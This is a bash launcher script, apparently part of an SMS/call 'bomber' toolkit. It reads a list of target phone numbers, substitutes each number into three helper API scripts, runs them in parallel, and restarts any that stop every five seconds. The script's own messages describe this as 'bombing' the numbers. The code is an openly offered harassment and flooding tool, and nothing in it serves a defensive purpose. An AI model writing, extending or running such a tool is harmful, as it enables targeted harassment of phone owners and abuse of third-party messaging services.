#!/bin/bash

script_dir="$(dirname "$0")"
numbers_file="$script_dir/active_numbers.txt"

# Function to start bombing for a single number
start_bombing() {
    local number="$1"
    local temp_dir="$script_dir/temp_$number"
    mkdir -p "$temp_dir"
    
    # Process api1.sh (PRIMARY SERVER)
    if [ -f "$script_dir/api1.sh" ]; then
        cp "$script_dir/api1.sh" "$temp_dir/api1_$number.sh"
        sed -i 's/\r$//' "$temp_dir/api1_$number.sh"
        sed -i "s/€tor/$number/g" "$temp_dir/api1_$number.sh"
        bash "$temp_dir/api1_$number.sh" &
    fi
    
    # Process api.sh (BACKUP SERVER)
    if [ -f "$script_dir/api.sh" ]; then
        cp "$script_dir/api.sh" "$temp_dir/api_$number.sh"
        sed -i 's/\r$//' "$temp_dir/api_$number.sh"
        sed -i "s/€tor/$number/g" "$temp_dir/api_$number.sh"
        bash "$temp_dir/api_$number.sh" &
    fi
    
    # Process new_api.sh (NEW SERVER)
    if [ -f "$script_dir/new_api.sh" ]; then
        cp "$script_dir/new_api.sh" "$temp_dir/new_api_$number.sh"
        sed -i 's/\r$//' "$temp_dir/new_api_$number.sh"
        sed -i "s/€tor/$number/g" "$temp_dir/new_api_$number.sh"
        bash "$temp_dir/new_api_$number.sh" &
    fi
}

echo -e "Starting Mixed API Bombing Mode..."
echo -e "Bombing on numbers: $(cat "$numbers_file" | tr '\n' ' ')"
echo -e "Mixed API bombing sequence initiated"

# Start bombing for each number
while IFS= read -r number; do
    echo -e "[*] Starting mixed bomber for: $number"
    start_bombing "$number"
done < "$numbers_file"

echo -e "\n[✓] All mixed bombers running in parallel. Press Ctrl+C to stop."

# Keep showing active processes
while true; do
    echo -e "\nActive bombing processes:"
    while IFS= read -r number; do
        if [ -d "$script_dir/temp_$number" ]; then
            echo -e "[✓] Mixed bomber active for: $number"
            # Restart bombing if it stopped
            pgrep -f "temp_$number" >/dev/null || {
                echo -e "[*] Restarting bomber for: $number"
                start_bombing "$number"
            }
        fi
    done < "$numbers_file"
    
    echo -e "\n[✓] All mixed bombers running in parallel. Press Ctrl+C to stop."
    sleep 5
done
